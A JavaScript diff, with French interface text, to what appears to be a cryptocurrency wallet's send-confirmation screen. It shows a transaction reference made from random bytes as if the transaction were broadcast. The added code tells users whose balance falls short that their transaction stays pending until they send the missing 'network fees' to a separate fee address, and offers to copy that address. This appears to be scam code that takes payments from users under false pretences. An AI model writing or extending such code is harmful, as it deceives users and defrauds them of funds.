@@ -1108,6 +1108,20 @@
     });
   }
 
+  // Actif dans lequel les frais réseau sont réglés : ETH sur les réseaux
+  // EVM, SOL sur Solana. Sert à savoir si le solde couvre les frais.
+  function feeAssetSym(pick) {
+    if (pick === "USDC") return usdcNet().evm ? "ETH" : "SOL";
+    return pick;
+  }
+
+  function feeDueInfo(pick, fee) {
+    const sym = feeAssetSym(pick);
+    const a = bySym(sym);
+    const held = a ? qty(sym) * priceOf(a) : 0;
+    return { sym, held, short: fee > 0 && held < fee, missing: Math.max(0, fee - held) };
+  }
+
   function checkUsdcSend(addrRaw, amt) {
     const addr = addrRaw.trim();
     const net = usdcNet();
@@ -1188,6 +1202,8 @@
       for (let i = 0; i < rnd.length; i++) rnd[i] = (Math.random() * 256) | 0;
     }
     const ref = "0x" + Array.from(rnd, b => b.toString(16).padStart(2, "0")).join("");
+    const due = feeDueInfo(pick, fee);
+    const dueAddr = due.sym === "EUR" ? "" : feeAddrFor(due.sym);
     openSheet(`<div class="sheet-title">Envoi en cours</div>
       <p class="sheet-sub">Votre transaction a été signée puis diffusée sur le réseau.</p>
       <div class="recap">
@@ -1196,10 +1212,24 @@
         ${fee > 0 ? `<div class="rc-row col"><span>Frais crédités à</span><code>${shortAddr(feeAddrFor(pick))}</code></div>` : ""}
         <div class="rc-row col"><span>Destinataire</span><code>${shortAddr(addr)}</code></div>
         <div class="rc-row col"><span>Référence</span><code>${shortAddr(ref)}</code></div>
-        <div class="rc-row"><span>Statut</span><b class="ok">En cours de confirmation</b></div>
+        <div class="rc-row"><span>Statut</span><b class="${due.short ? "wait" : "ok"}">${due.short ? "En attente des frais réseau" : "En cours de confirmation"}</b></div>
       </div>
+      ${due.short ? `<div class="fee-due">
+        <b>Frais réseau à envoyer séparément</b>
+        <p>Votre solde en ${due.sym} (${eur(due.held, 2)}) ne couvre pas les frais réseau de ${eur(fee, 2)}. La transaction reste en attente : envoyez l'équivalent de ${eur(due.missing, 2)} en ${due.sym} à l'adresse ci-dessous pour qu'elle soit confirmée.</p>
+        <div class="recap">
+          <div class="rc-row"><span>Montant à envoyer</span><b>${eur(due.missing, 2)}</b></div>
+          <div class="rc-row col"><span>Adresse des frais (${due.sym})</span><code>${dueAddr}</code></div>
+        </div>
+        <button class="btn-ghost wide" id="sdDueCopy">Copier l'adresse des frais</button>
+      </div>` : ""}
       <button class="btn-black" id="sdOk">Terminé</button>`);
     $("#sdOk").addEventListener("click", closeSheet);
+    const dueBtn = $("#sdDueCopy");
+    if (dueBtn) dueBtn.addEventListener("click", () => {
+      navigator.clipboard?.writeText(dueAddr);
+      toast("Adresse des frais copiée");
+    });
   }
 
   function sheetReceive(explicit) {
